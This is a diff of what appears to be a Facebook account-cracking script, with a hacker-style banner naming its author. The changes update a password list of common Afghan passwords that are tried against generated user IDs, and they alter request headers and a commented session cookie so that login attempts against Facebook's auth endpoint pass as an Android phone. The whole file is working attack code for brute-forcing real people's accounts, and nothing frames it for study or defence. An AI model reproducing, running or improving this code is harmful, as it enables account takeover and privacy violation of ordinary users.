@@ -381,7 +381,7 @@ logo ="""
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m FACEBOOK    :  Mafia Rayess
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m WHATSAPP     :  93783361438
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m GITHUB      :  Criminal313
-\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m VERSION     :  2.5
+\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m VERSION     :  9.5
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;32m TOOL        :  \033[1;34mFILE-/RANDOM\033[1;32m
 \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m WHATSAPP GROUP    :  \033[1;91m\033[1;41m\033[1;33mKHOSTI FREE CAMMANDS 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
@@ -834,7 +834,7 @@ def afghanistan():
 			print('\033[10;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 			for psx in user:
 				uid = code+psx
-				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786','50005000','786786']
+				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786','50005000','786786','۵۰۰۵۰۰','۴۲۰۴۲۰']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
@@ -1065,26 +1065,26 @@ def rndm1(uid,passlist):
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                         }
                         headers = {
-    'authority': 'www.facebook.com',
+    'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; wl_cbv=v2%3Bclient_version%3A2445%3Btimestamp%3A1711116599; dpr=3.7835533618927; m_pixel_ratio=3.7835533618927; wd=712x1308; fr=1KBJ9oOPgo4cePG8z.AWVXQGllc_d4xxP9FMjiuvMBe4k.BmBq2I..AAA.0.0.BmDs0a.AWXFjNoklRE',
+    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; locale=en_US; m_pixel_ratio=3.43505597114563; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712338010; x-referer=eyJyIjoiL3NldHRpbmdzL2VtYWlsLyIsImgiOiIvc2V0dGluZ3MvZW1haWwvP19fd2JsdD0xIiwicyI6Im0ifQ%3D%3D; wd=315x578; fr=1KBJ9oOPgo4cePG8z.AWUJoi2xRsUuxYa8TnRmZEAi_XM.BmBq2I..AAA.0.0.BmEDSk.AWXXMF2EuE8',
     'dpr': '2.75',
-    'referer': 'https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Fwww.facebook.com%2F',
+    'referer': 'https://www.facebook.com/',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Mi Note 10 Lite"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'same-site',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
                         url = 'https://b-graph.facebook.com/auth/login'
